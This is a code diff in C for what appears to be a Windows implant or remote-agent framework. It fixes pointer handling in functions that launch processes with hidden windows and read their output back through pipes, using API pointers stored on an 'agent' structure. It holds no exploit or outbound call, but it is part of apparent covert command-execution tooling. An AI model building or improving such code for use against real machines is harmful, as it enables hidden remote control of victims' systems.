@@ -134,9 +134,9 @@ BOOL NtProcessCreate(IN PWSTR TargetProcess, IN PWSTR ProcessParameters, IN PWST
 
 }
 
-BOOL ProcessCreate(IN BOOL PIPED, IN LPSTR ApplicationName, IN LPSTR CommandLine, OUT LPPROCESS_INFORMATION pi, OUT PPIPE pPipe) {
+BOOL ProcessCreate(IN BOOL PIPED, IN LPSTR ApplicationName, IN LPSTR CommandLine, OUT LPPROCESS_INFORMATION pi, OUT PPIPE *pPipe) {
 
-	pPipe = (PPIPE)agent->apis->pLocalAlloc(LPTR, sizeof(PIPE));
+	*pPipe = (PPIPE)agent->apis->pLocalAlloc(LPTR, sizeof(PIPE));
 
 	BOOL Success = 0;
 	STARTUPINFO si = {0};
@@ -146,12 +146,12 @@ BOOL ProcessCreate(IN BOOL PIPED, IN LPSTR ApplicationName, IN LPSTR CommandLine
 	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
 	si.wShowWindow = SW_HIDE;
 	if(PIPED) {
-		if(!PipeCreate(pPipe)) {
+		if(!PipeCreate(*pPipe)) {
 			printf("[error] failed to create pipe\n");
 		} else {
 			si.hStdInput = NULL;
-			si.hStdOutput = pPipe->hWritePipe;
-			si.hStdError = pPipe->hWritePipe;
+			si.hStdOutput = (*pPipe)->hWritePipe;
+			si.hStdError = (*pPipe)->hWritePipe;
 
 		}
 	}
@@ -180,7 +180,7 @@ BOOL PipeCreate(OUT PPIPE pPipe) {
 	return TRUE;
 }
 
-INT PipeRead(IN PPIPE pPipe, PUCHAR Buffer, PDWORD dwRead) {
+INT PipeRead(IN PPIPE pPipe, PVOID* Buffer, PDWORD dwRead) {
 
 	UCHAR Buf[1024] = {0};
 	DWORD BufferSize = 0;
@@ -193,8 +193,8 @@ INT PipeRead(IN PPIPE pPipe, PUCHAR Buffer, PDWORD dwRead) {
 		pPipe->hWritePipe = NULL;
 	}
 
-	Buffer = (PUCHAR)agent->apis->pLocalAlloc(LPTR, 0);
-	if(Buffer == NULL) {
+	*Buffer = (PUCHAR)agent->apis->pLocalAlloc(LPTR, 0);
+	if(*Buffer == NULL) {
 		return -1;
 	}
 
@@ -204,9 +204,9 @@ INT PipeRead(IN PPIPE pPipe, PUCHAR Buffer, PDWORD dwRead) {
 			break;
 		}
 		BufferSize += dwBytesRead;
-		Buffer = (PUCHAR)agent->apis->pLocalReAlloc(Buffer, BufferSize, LMEM_MOVEABLE);
+		*Buffer = (PUCHAR)agent->apis->pLocalReAlloc(*Buffer, BufferSize, LMEM_MOVEABLE);
 
-		MemoryCopy(Buffer + (BufferSize - dwBytesRead), Buf, dwBytesRead);
+		MemoryCopy((*Buffer) + (BufferSize - dwBytesRead), Buf, dwBytesRead);
 
 
 	} while (Success == TRUE);
